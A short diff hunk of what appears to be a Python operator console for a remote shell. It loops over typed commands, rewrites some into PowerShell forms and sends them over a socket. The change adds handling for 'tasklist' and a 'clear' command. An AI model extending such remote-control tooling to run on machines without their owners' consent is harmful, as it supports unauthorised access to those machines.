@@ -356,6 +356,16 @@ while not stop:
         stdin = "k \"" + stdin[2:] + "\""
     elif stdin == "ls" or stdin.startswith("ls "):
         stdin = "(" + stdin + " | out-string).trim()"
+    elif stdin.startswith("tasklist"):
+        stdin = "(" + stdin + " | out-string).trim()"
+    elif stdin == "clear":
+        if sys.platform[:5] == "linux" or sys.platform == "darwin":
+            os.system("clear")
+        elif sys.platform == "win32":
+            os.system("cls")
+        else:
+            print("ERROR: Operating system not compatible, unable to clear screen.")
+        stdin = "clear"
     last = stdin
     conn.send((stdin + "\n").encode())
 s.close()
